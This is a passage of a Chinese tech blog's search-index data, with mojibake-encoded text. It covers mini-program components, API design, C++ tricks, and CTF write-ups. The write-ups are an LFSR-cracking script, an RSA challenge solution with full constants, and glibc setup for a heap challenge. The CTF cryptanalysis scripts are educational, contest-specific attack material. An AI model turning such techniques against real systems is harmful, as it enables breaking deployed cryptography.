æ¡†æ¶ä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç³»åˆ—åŸºç¡€ç»„ä»¶ï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡ç»„åˆè¿™äº›åŸºç¡€ç»„ä»¶è¿›è¡Œå¿«é€Ÿå¼€å‘ã€‚è¯¦ç»†ä»‹ç»è¯·å‚è€ƒç»„ä»¶æ–‡æ¡£ã€‚\nä»€ä¹ˆæ˜¯ç»„ä»¶ï¼š\n ç»„ä»¶æ˜¯è§†å›¾å±‚çš„åŸºæœ¬ç»„æˆå•å…ƒã€‚ ç»„ä»¶è‡ªå¸¦ä¸€äº›åŠŸèƒ½ä¸å¾®ä¿¡é£æ ¼ä¸€è‡´çš„æ ·å¼ã€‚ ä¸€ä¸ªç»„ä»¶é€šå¸¸åŒ…æ‹¬ å¼€å§‹æ ‡ç­¾ å’Œ ç»“æŸæ ‡ç­¾ï¼Œå±æ€§ ç”¨æ¥ä¿®é¥°è¿™ä¸ªç»„ä»¶ï¼Œå†…å®¹ åœ¨ä¸¤ä¸ªæ ‡ç­¾ä¹‹å†…ã€‚  \u0026lt;tagname property=\u0026#34;value\u0026#34;\u0026gt;Content goes here ...\u0026lt;/tagname\u0026gt; æ³¨æ„ï¼šæ‰€æœ‰ç»„ä»¶ä¸å±æ€§éƒ½æ˜¯å°å†™ï¼Œä»¥è¿å­—ç¬¦-è¿æ¥\nå±æ€§ç±»å‹ #     ç±»å‹ æè¿° æ³¨è§£     Boolean å¸ƒå°”å€¼ ç»„ä»¶å†™ä¸Šè¯¥å±æ€§ï¼Œä¸ç®¡æ˜¯ä»€ä¹ˆå€¼éƒ½è¢«å½“ä½œ trueï¼›åªæœ‰ç»„ä»¶ä¸Šæ²¡æœ‰è¯¥å±æ€§æ—¶ï¼Œå±æ€§å€¼æ‰ä¸ºfalseã€‚ å¦‚æœå±æ€§å€¼ä¸ºå˜é‡ï¼Œå˜é‡çš„å€¼ä¼šè¢«è½¬æ¢ä¸ºBooleanç±»å‹   Number æ•°å­— 1, 2.5   String å­—ç¬¦ä¸² \u0026quot;string\u0026quot;   Array æ•°ç»„ [ 1, \u0026quot;string\u0026quot; ]   Object å¯¹è±¡ { key: value }   EventHandler äº‹ä»¶å¤„ç†å‡½æ•°å \u0026quot;handlerName\u0026quot; æ˜¯ Page ä¸­å®šä¹‰çš„äº‹ä»¶å¤„ç†å‡½æ•°å   Any ä»»æ„å±æ€§     å…¬å…±å±æ€§ #  æ‰€æœ‰ç»„ä»¶éƒ½æœ‰ä»¥ä¸‹å±æ€§ï¼š\n   å±æ€§å ç±»å‹ æè¿° æ³¨è§£     id String ç»„ä»¶çš„å”¯ä¸€æ ‡ç¤º ä¿æŒæ•´ä¸ªé¡µé¢å”¯ä¸€   class String ç»„ä»¶çš„æ ·å¼ç±» åœ¨å¯¹åº”çš„ WXSS ä¸­å®šä¹‰çš„æ ·å¼ç±»   style String ç»„ä»¶çš„å†…è”æ ·å¼ å¯ä»¥åŠ¨æ€è®¾ç½®çš„å†…è”æ ·å¼   hidden Boolean ç»„ä»¶æ˜¯å¦æ˜¾ç¤º æ‰€æœ‰ç»„ä»¶é»˜è®¤æ˜¾ç¤º   data-* Any è‡ªå®šä¹‰å±æ€§ ç»„ä»¶ä¸Šè§¦å‘çš„äº‹ä»¶æ—¶ï¼Œä¼šå‘é€ç»™äº‹ä»¶å¤„ç†å‡½æ•°   bind* / catch* EventHandler ç»„ä»¶çš„äº‹ä»¶ è¯¦è§äº‹ä»¶    ç‰¹æ®Šå±æ€§ #  å‡ ä¹æ‰€æœ‰ç»„ä»¶éƒ½æœ‰å„è‡ªå®šä¹‰çš„å±æ€§ï¼Œå¯ä»¥å¯¹è¯¥ç»„ä»¶çš„åŠŸèƒ½æˆ–æ ·å¼è¿›è¡Œä¿®é¥°ï¼Œè¯·å‚è€ƒå„ä¸ªç»„ä»¶çš„å®šä¹‰ã€‚\n"},{"id":153,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/api%E8%AE%BE%E8%AE%A1/","title":"Apiè®¾è®¡","section":"æ‚é¡¹åšå®¢","content":"API è®¾è®¡ #  RESTful #   For TypeScript: https://github.com/thiagobustamante/typescript-rest\n REST: Representational state transfer.\nRESTful æ˜¯ä¸€ç§é¢å‘èµ„æºçš„è¿‡æ—¶ API è®¾è®¡ç†å¿µï¼Œä»–åŸºäº http åè®®ï¼Œæ²¡æœ‰å•ç‹¬å®šä¹‰è‡ªå·±çš„ä¸€å¥—åè®®ï¼Œåªæ˜¯ä¸€ç§ API è®¾è®¡èŒƒå¼ã€‚\nå®ƒæä¾›äº†å››ä¸ªæŒ‡å¯¼åŸåˆ™ï¼š\n Resource-Base åŸºäºèµ„æºçš„ï¼šä¸€ä¸ª uri å•ç‹¬å¯¹åº”äºä¸€ä¸ªèµ„æºï¼› Manipulation Through Representations åŠ¨ä½œè¡¨ç¤ºï¼šå¯¹èµ„æºçš„ä¸åŒåŠ¨ä½œé€šè¿‡æ–¹æ³•æˆ–å‚æ•°è¡¨ç¤ºï¼› Self-Descriptive Message è‡ªæè¿°ä¿¡æ¯ï¼šæ¯æ¡è¯·æ±‚éƒ½èƒ½æ²¡æœ‰ä¸Šä¸‹æ–‡åœ°æ— çŠ¶æ€åœ°ï¼Œå”¯ä¸€æ‰§è¡Œä¸€ä¸ªåŠ¨ä½œï¼› Hypermedia as the Engine of Application State (HATEOAS)ï¼šç”¨é«˜çº§çš„è¯·æ±‚ä½“æ¥è¡¨ç¤ºçŠ¶æ€ï¼›  GraphQL #   For TypeScript: https://github.com/MichalLytek/type-graphql, https://typegraphql.com/\nOfficial Website: https://graphql.org/\n GraphQL: Graph Query Language.\n  ä»‹ç»ï¼šGraphQL æ˜¯ Facebook ä¸ºäº†è§£å†³ RESTful è®¾è®¡æ¨¡å¼åœ¨ç³»ç»Ÿåºå¤§ä¹‹åå‡ºç°çš„å„ç§é—®é¢˜åº”è¿è€Œç”Ÿçš„æ¥å£æè¿°è¯­è¨€ã€‚\n  åœ¨ API è®¾è®¡è¿™ä¸ªé—®é¢˜ä¸Šï¼šGraph API å¯¹å¤–åªæš´éœ²ä¸€ä¸ªæ¥å£ï¼ˆæ¯”å¦‚ï¼šhttps://leetcode.com/graphqlï¼‰ï¼Œèµ„æºé€šè¿‡å›¾çš„æ–¹å¼å…³è”å¼åœ°è®¾è®¡åœ¨è¿™ä¸ªæ¥å£ä¸­ã€‚\n  ä¸ RESTfulï¼šåœ¨ç³»ç»Ÿä¸­ï¼ŒGraphQL ä¸ RESTful é€šå¸¸æ˜¯åŒæ—¶å­˜åœ¨çš„å…³ç³»è€Œä¸æ˜¯å®Œå…¨å–ä»£ã€‚\n  PS: è®¸å¤šè¯¸å¦‚ GraphQL ä¸ RESTful çš„åŒºåˆ«ç­‰é—®é¢˜å¯ä»¥æŸ¥çœ‹å®˜æ–¹çš„æ–‡æ¡£ï¼šhttps://graphql.org/faq/#does-graphql-use-http\nThrift-RPC #   å®˜æ–¹ï¼šhttps://thrift.apache.org/ã€\nIDL æ–‡æ¡£ï¼šhttps://thrift.apache.org/docs/idl.html\n Thrift æ˜¯ä»€ä¹ˆï¼ŒApache æä¾›çš„ä¸€ä¸ª API åºåˆ—åŒ–æ¡†æ¶ï¼š\n Apache Thrift æ˜¯ä¸€ä¸ªè·¨è¯­éŸ³çš„å¯æ‰©å±•æœåŠ¡å™¨å¼€å‘æ¡†æ¶ï¼Œå¯ä»¥åœ¨è¯­è¨€é—´æ— ç¼é«˜æ•ˆåœ°è¿ç§»ã€‚  gRPC #  "},{"id":154,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/cpp%E6%9D%82%E6%8A%80/","title":"Cppæ‚æŠ€","section":"æ‚é¡¹åšå®¢","content":"cpp æ‚æŠ€ #  __builtin_expectï¼šä¸€ä¸ª if åˆ†æ”¯æå¤§å¯èƒ½ä¸ä¼šæ‰§è¡Œï¼Œä½¿ç”¨è¿™ä¸ªç¼–è¯‘ï¼Œé™„è¿‘çš„ï¼Œç¼–è¯‘å™¨ä¼šå°†æå¤§æ¦‚ç‡è¿ç»­æ‰§è¡Œçš„ä»£ç ç¼–è¯‘ä¸ºè¿ç»­çš„äºŒè¿›åˆ¶ã€‚\n__attribute__ ç›¸å…³ï¼ˆæŸ¥çœ‹ GNU å®˜æ–¹æ–‡æ¡£ ï¼‰ï¼š\n  unused: æ˜¾å¼åœ°æŒ‡å®šä¸€ä¸ªå˜é‡ä¸ä¼šè¢«ä½¿ç”¨ï¼Œ-Wall ç¼–è¯‘æ—¶ä¸ä¼šæŠ›å‡ºè­¦å‘Šï¼Œæ¯”å¦‚ï¼šint main(int argc __attribute__((unused)), char **argv)ï¼›\n  format: ä¼ é€’ printf ç±»ä¼¼çš„å‚æ•°æ—¶è¿›è¡Œå‚æ•°æ ¡éªŒï¼Œæ¯”å¦‚ï¼šextern void printfBy(int flag, const char *format, ...) __attribute__((format(printf, 2, 3)));\n  noreturn: æ˜¾å¼åœ°å‘Šè¯‰ç¼–è¯‘å™¨å¯¹åº”çš„å‡½æ•°ä¸ä¼šè°ƒç”¨ exit æˆ– abort ç­‰å‡½æ•°ï¼›\n  å¦‚ä½•å®šä¹‰ä¸€ä¸ªåªèƒ½åˆ†é…åœ¨æ ˆï¼ˆå †ï¼‰ä¸Šçš„ç±»ï¼ˆå‚è€ƒåšå®¢ï¼‰ï¼š\n  å°†ææ„å‡½æ•°å®šä¹‰ä¸ºç§æœ‰å‡½æ•°ï¼Œç¼–è¯‘å™¨æ— æ³•åœ¨æ ˆåˆ†é…æ—¶è°ƒç”¨ææ„æ–¹æ³•ã€‚å¯¹è±¡å°†åªèƒ½è¢«å®šä¹‰åœ¨å †ä¸Šï¼›\n  é‡è½½ new() ä¸ delete()ï¼Œå¯¹è±¡æ— æ³•è¢«åŠ¨æ€åˆ†é…ã€‚å¯¹è±¡å°†åªèƒ½è¢«å®šä¹‰åœ¨æ ˆä¸Šï¼›\n  ç”¨çº¯ C å®ç° C++ ç±»ç»§æ‰¿ä¸­çš„åŠ¨æ€è™šå‡½æ•°ç‰¹æ€§ï¼ˆå‚è€ƒåšå®¢ï¼‰ï¼Œå®ç°è™šå‡½æ•°è¡¨ã€‚\nå®šä¹‰ç»“æ„ä½“ç¼–è¯‘å¯¹é½æ–¹æ³•ï¼Œæ¯”å¦‚æŒ‰å››å­—èŠ‚å¯¹é½ï¼š\n#pragma pack(push) #pragma pack(4) ... #pragma pack(pop) "},{"id":155,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/cpp%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%E6%A2%B3%E7%90%86/","title":"CppçŸ¥è¯†ä½“ç³»æ¢³ç†","section":"æ‚é¡¹åšå®¢","content":" å¤ä¹ åœ°å€:\n https://github.com/huihut/interview   C++ çŸ¥è¯†ç»“æ„ç³»ç»Ÿæ¢³ç† #  å…³é”®å­— #  é›¶ç¢çŸ¥è¯† #  é¢å‘å¯¹è±¡ #  æ™ºèƒ½æŒ‡é’ˆ #  æ™ºèƒ½æŒ‡é’ˆå®šä¹‰åœ¨å¤´æ–‡ä»¶ memory ä¸­ã€‚\nå¼ºåˆ¶ç±»å‹è½¬æ¢ #  STL #  Deque çš„å…¨ç§°æ˜¯ double ended queueï¼Œä¸¤ç«¯ç»“æŸé˜Ÿåˆ—ï¼›\nå®ƒæ˜¯ stack ä¸ queque çš„åº•å±‚å­˜å‚¨ç»“æ„ï¼Œå®ƒçš„å®ç°åŸºäº vector çš„å®ç°ï¼Œå®ƒç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š\nå¯ä»¥çœ‹åˆ°è¿™æ ·å­˜å‚¨çš„ä¼˜ç‚¹æ˜¯ï¼š\n ä»ç„¶å¯ä»¥é€šè¿‡æ¥è¿‘ä¸ O(1) å¸¸æ•°çº§åˆ«çš„æ—¶é—´å¤æ‚åº¦è¿›è¡Œè®¿é—®ï¼› åœ¨ä¸¤ç«¯çš„æ’å…¥åˆ é™¤å¤æ‚åº¦ä»ç„¶ä¸º O(1)ï¼›  å¯¹äº stack ä¸ queue è¿™æ ·çš„ä»…ä»…åœ¨åŒç«¯æœ‰æ’å…¥åˆ é™¤è®¿é—®æ“ä½œçš„æ•°æ®ç»“æ„ï¼Œæ˜¯ä¸€ä¸ªåˆé€‚çš„åŸºç±»ï¼›\n"},{"id":156,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019de1ctf/babylfsr/","title":"Babylfsr","section":"2019de1ctf","content":"baby lfsr #  åœ¨æ¯”èµ›çš„æ—¶å€™ä¸€ç›´åœ¨æƒ³æ€ä¹ˆç”¨ berlekamp_massey ç®—æ³•æ±‚è§£ï¼ˆç”¨çŸ©é˜µæ±‚è§£ï¼Œå†™ä»£ç æ›´å¿«ï¼Œ512 æ¯”ç‰¹æ²¡å¿…è¦ç”¨ BM ç®—æ³•ï¼‰ï¼Œå¹¶ä¸”æŠŠåˆ¤æ–­æ¡ä»¶æŠ„æˆäº† 1124 \u0026hellip;.\nè„šæœ¬ #  ç ´è§£ LFSRï¼šæŒ‡å®šä¸€ä¸ªæ¯”ç‰¹åºåˆ—ï¼Œè¿”å›ä¸€ä¸ªè½¬ç§»çŸ©é˜µï¼ˆå®ç°æ–¹å¼è¯¦è§ https://github.com/shesl-meow/shesl-cryptoï¼‰ã€‚\næœ€ç»ˆçš„ç ´è§£è„šæœ¬ï¼š\n#!/usr/bin/env python2 # coding=utf-8 import hashlib from sage.all import * from itertools import product  from sheslcrypto.LFSR import CrackLfsr  if __name__==\u0026#34;__main__\u0026#34;:  with open(\u0026#34;output\u0026#34;, \u0026#34;r\u0026#34;) as f:  raw = [int(b) for b in f.read().strip()]   for num in product([0, 1], repeat=8):  CL = CrackLfsr(raw + list(num), period=256)  try:  T = CL.crack_by_matrix()  except AssertionError:  continue  Tn = T ** 256  initial = Tn.solve_left(vector(raw[:256]))  key = ZZ(list(initial)[::-1], base=2)  flag = hashlib.sha256(key.hex().rstrip(\u0026#39;L\u0026#39;)).hexdigest()  print flag  if flag[:4] == \u0026#34;1224\u0026#34;: break "},{"id":157,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019de1ctf/babyrsa/","title":"Babyrsa","section":"2019de1ctf","content":"baby rsa #  è¿™é¢˜æ¶‰åŠäº†å¤§é‡çš„ RSA ç›¸å…³çš„ç ´è§£çŸ¥è¯†ã€‚\né¢˜ç›® #  é˜…è¯»é¢˜ç›®ä¹‹åå®é™…ä¸Šå°±æ˜¯è§£æ•°ä¸ªæ–¹ç¨‹ï¼Œåœ¨æ²¡æœ‰ hint çš„æƒ…å†µä¸‹ï¼Œæ–¹ç¨‹å¦‚ä¸‹ï¼š\n  $$\\begin{cases} p^4 \\equiv C_{1} \\pmod{N_{1}} \\ p^4 \\equiv C_{2} \\pmod{N_{2}} \\ p^4 \\equiv C_{3} \\pmod{N_{3}} \\ p^4 \\equiv C_{4} \\pmod{N_{4}}\\end{cases}$$\n  $$\\begin{cases} (e_1)^{42} \u0026amp;\\equiv C_{e1} \\pmod{N_e} \\ (e_2 + T)^3 \u0026amp;\\equiv C_{e2} \\pmod{N_e}\\end{cases}$$\n  $$q_1 * x = N_q \\text{ where } q_1 \u0026lt; x$$\n  $$\\begin{cases} flag^{e_1} \\equiv C_{f1} \\pmod{p * q_1} \\ flag^{e_2} \\equiv C_{f2} \\pmod{p * q_2}\\end{cases}$$\n  ä¸Šé¢æ‰€æœ‰æ–¹ç¨‹çš„å¤§å†™å­—æ¯å‡ä¸ºå·²çŸ¥æ•°å­—ã€‚\nè„šæœ¬ #  æœ€åçš„åˆ†æä½¿ç”¨äº†ä¸‰ä¸ªæ”»å‡»æŠ€å·§ï¼ˆå®ç°æ–¹å¼è¯¦è§ https://github.com/shesl-meow/shesl-cryptoï¼‰ï¼š\n  åˆ†è§£å¤§å°ç›¸è¿‘çš„ç´ æ•°ç§¯\n  å°æŒ‡æ•°å¾—åˆ°æ˜æ–‡\n  æŒ‡æ•°ä¸æ¬§æ‹‰å‡½æ•°ä¸äº’ç´ æ±‚è§£ã€‚\n  å…³äºå…¶ä¸­çš„ç¬¬ä¸‰ç‚¹ã€‚å› ä¸ºåœ¨æœ€åä¸€æ­¥éœ€è¦è§£ä¸‹é¢çš„æ–¹ç¨‹ï¼ˆå…¶ä¸­åªæœ‰ flag ä¸€ä¸ªæœªçŸ¥æ•°ï¼‰ï¼š\n $$flag^{e_1} \\equiv C_{f1} \\pmod{p * q_1}$$  å› ä¸ºä¸Šé¢çš„ e1 ä¸ phi(p*q1) ä¸æ˜¯äº’ç´ çš„ï¼Œä¸èƒ½ç”¨å¸¸è§„çš„æ–¹ç¨‹æ±‚è§£ã€‚\nä¸Šé¢çš„æ–¹ç¨‹æ˜¾ç„¶å¯ä»¥è¢«æˆ‘ä»¬åˆ†è§£æˆä¸¤ä¸ªç‹¬ç«‹çš„æ–¹ç¨‹ï¼Œç„¶åæˆ‘ä»¬å•ç‹¬ç ”ç©¶åè€…ï¼ˆå› ä¸ºæŒ‡æ•° e ä¸åè€…çš„æ¬§æ‹‰å‡½æ•°ï¼Œæœ€å°å…¬å€æ•°æ›´å°ï¼Œæˆ‘ä»¬æ›´å®¹æ˜“ç›´æ¥å¼€æ–¹ï¼‰ï¼š\n è®¾ï¼š$$phi = q_1 -1, g = gcd(phi, e_1)$$ æˆ‘ä»¬è€ƒè™‘ $$flag^{g}$$ ä½œä¸ºè¿™ä¸ªåŠ å¯†ä½“ç³»çš„æ˜æ–‡ï¼Œå¯ä»¥æ ¹æ®å¸¸è§„çš„ RSA è§£å‡ºï¼š  $$\\displaystyle e_g = \\frac{e_1}{g}, d_g \\equiv (e_g)^{-1} \\pmod{phi}$$ $$flag^g \\equiv (C_{f1})^{d_g} \\pmod{q_1}$$   å› ä¸ºè¿™ä¸ªæ—¶å€™çš„ gï¼Œå·²ç»éå¸¸å°äº†å¯ä»¥ç›´æ¥æŒ‰å°æŒ‡æ•°å¾—åˆ°æ˜æ–‡  å®Œæ•´çš„è„šæœ¬å¦‚ä¸‹ï¼š\n#!/usr/bin/env python2 from sage.all import * from binascii import a2b_hex  from sheslcrypto.RSA import CrackNearPQ, CrackSmallE, CrackEPhiNotRP from const import *  if __name__ == \u0026#34;__main__\u0026#34;:  p4 = crt([C1, C2, C3, C4], [N1, N2, N3, N4])  CRSE = CrackSmallE(p4, 4, N1 * N2 * N3 * N4)  p = CRSE.crack()  assert is_prime(p)  print \u0026#34;p: %d\u0026#34; % p   CRSE = CrackSmallE(Ce1, 42, Ne)  e1 = CRSE.crack()  print \u0026#34;e1: %d\u0026#34; % e1  CRSE = CrackSmallE(Ce2, 3, Ne)  e2 = (CRSE.crack() - T) % Ne  print \u0026#34;e2: %d\u0026#34; % e2   CNPQ = CrackNearPQ(Nq)  q1,_ = CNPQ.crack()  print \u0026#34;q1: %d\u0026#34; % q1   CEPM = CrackEPhiNotRP(Cf1, e1, p, q1)  flag = CEPM.crack_by_q()  print \u0026#34;flag: %s\u0026#34; % a2b_hex(flag.hex()) é™„å½• #  const.py\nN1 = 20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L C1 = 19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L N2 = 31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L C2 = 15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L N3 = 29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L C3 = 18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L N4 = 25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L C4 = 2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L  Ce1 = 45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384 Ce2 = 13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158 T = 864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387 Ne = 15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039  Nq = 16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603  Cf1 = 262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124 Cf2 = 7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596 "},{"id":158,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019ogeek/bookmanager/","title":"Bookmanager","section":"2019OGeek","content":"å†™åœ¨å‰é¢ #  ç¬¬ä¸€æ¬¡æ¯”èµ›ä¸€ä¸ªå †æº¢å‡ºé¢˜ç›®å¿«è¦åšå‡ºæ¥äº†ï¼Œå´å› ä¸ºç¯å¢ƒé…ç½®é—®é¢˜ï¼ˆä¸€ç›´æ— æ³•ç”¨ç»™å®šç‰ˆæœ¬çš„ libc.so è¿è¡Œç¨‹åºï¼‰ã€‚æœ€åä¸å¾—ä¸å†æºç ç¼–è¯‘ glibc-2.23ï¼ˆå‘å¤ªå¤šäº†ï¼Œç³»ç»Ÿè¢«æå´©äº†ä¸€æ¬¡ï¼‰ï¼Œå¿ƒæ€çˆ†ç‚¸ã€‚\næŒ‡å®šç‰ˆæœ¬çš„ libc è¿è¡Œç¨‹åº #  æ€»ç»“ä¸€ä¸‹åˆ°åº•åº”è¯¥å¦‚ä½•ä½¿ç”¨ä¸€ä¸ªç»™å®šçš„ glibc åº“æ–‡ä»¶è¿è¡ŒæŒ‡å®šçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼š\n  ç¬¬ä¸€æ­¥åˆ™æ˜¯éœ€è¦æ‹¿åˆ°æŒ‡å®šçš„ ld.so æ–‡ä»¶ï¼ˆç”¨äºé“¾æ¥ libc.so ä¸å¯æ‰§è¡Œæ–‡ä»¶çš„ç¨‹åºï¼‰ï¼Œå°†ç›®æ ‡æ–‡ä»¶çš„é“¾æ¥ç¨‹åºåœ°å€æŒ‡å‘æœ¬åœ°çš„ ld.so æ–‡ä»¶ã€‚\nè¿™ä¸€æ­¥ç½‘ä¸Šæœ‰ python è„šæœ¬ï¼Œä½†æ˜¯ä½¿ç”¨ patchelf è¿™ä¸ªå‘½ä»¤æ›´å¿«ã€‚\n  ç¬¬äºŒæ­¥æ˜¯è®¾ç½® LD_PRELOAD ç¯å¢ƒå˜é‡ã€‚\n  æ¯”å¦‚è¯´ï¼Œè¿™ä¸ªç¨‹åºéœ€è¦è¿è¡Œ libc-2.23.soï¼Œæˆ‘ä»¬å°±éœ€è¦æ‰§è¡Œä»¥ä¸‹çš„ä¸¤æ¡å‘½ä»¤ï¼š\n$ patchelf --set-interpreter /usr/local/glibc-2.23/lib/ld-2.23.so bookmanager  $ export LD_PRELOAD=/usr/local/glibc-2.23/lib/libc-2.23.so å¦‚æœæˆ‘ä»¬å·²ç»å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œé“¾æ¥ç¨‹åºçš„åœ°å€è®¾ç½®å¥½äº†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å† pwntools ä¸­è¿™ä¹ˆè¿è¡Œï¼š\nfrom pwn import * p = process([\u0026#34;./bookmanager\u0026#34;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;/usr/local/glibc-2.23/lib/libc-2.23.so\u0026#34;}) ç¼–è¯‘æŒ‡å®šç‰ˆæœ¬çš„ libc #  ä½†æ˜¯ä¸Šé¢æˆ‘æ–‡ä»¶ä¸­çš„ ld.so æ–‡ä»¶ï¼Œé¢˜ç›®æ˜¯æ²¡æœ‰ç»™çš„ï¼Œäºæ˜¯æˆ‘ä»¬å°±éœ€è¦é€šè¿‡æºç ç¼–è¯‘çš„æ–¹å¼å¾—åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚\n ç½‘ä¸Šåº”è¯¥ä¼šæœ‰ç›´æ¥çš„èµ„æºä¸‹è½½ï¼Œä½†æ˜¯æˆ‘å¤ªèœäº†ï¼Œæ²¡æœ‰æ‰¾åˆ°ï¼Œåªæ‰¾åˆ°äº†æºç çš„å›½å†…é•œåƒ  å¦‚æœæ²¡æœ‰é‡åˆ°ä»»ä½•é—®é¢˜ï¼Œä¸‹é¢å‡ æ¡å‘½ä»¤åº”è¯¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¼–è¯‘æµç¨‹ï¼š\n$ wget http://mirrors.nju.edu.cn/gnu/libc/glibc-2.23.tar.bz2  $ tar -xf glibc-2.23.tar.bz2  $ mkdir ./glibc-2.23/glibc-build \u0026amp;\u0026amp; cd ./glibc-2.23/glibc-build  $ ../configure --prefix=/usr/local/glibc-2.23 --disable-werror  $ make \u0026amp;\u0026amp; make install 